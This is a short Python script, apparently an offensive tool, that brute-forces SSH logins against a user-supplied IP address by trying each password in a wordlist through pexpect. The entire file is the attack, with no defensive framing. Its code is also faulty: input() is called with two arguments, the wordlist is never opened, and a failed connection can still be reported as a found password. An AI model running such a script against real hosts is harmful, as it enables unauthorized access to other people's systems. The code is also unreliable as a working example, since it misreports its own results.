#!/usr/bin/python3
#brute force ssh specifying a file with passwords

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print(colored('[-] Error Connecting', 'red'))
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,'[P|p]assword: '])
        if ret == 0:
            print(colored('[-] Error Connecting', 'red'))
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)
    return child

def main():
    host = input("[*] Enter IP for bruteforcing: ")
    user = input("[*] Enter Username for bruteforcing: ")
    file = input("[*] Path to a list of passwords: ", 'r')
    for password in file.readlines():
        password = password.strip('\r').strip('\n')
        try:
            child = connect(user, host, password)
            print(colored('[+] Password found: ' + password, 'magenta'))
        except:
            print(colored('[-] Wrong password: ' + password, 'cyan'))

main()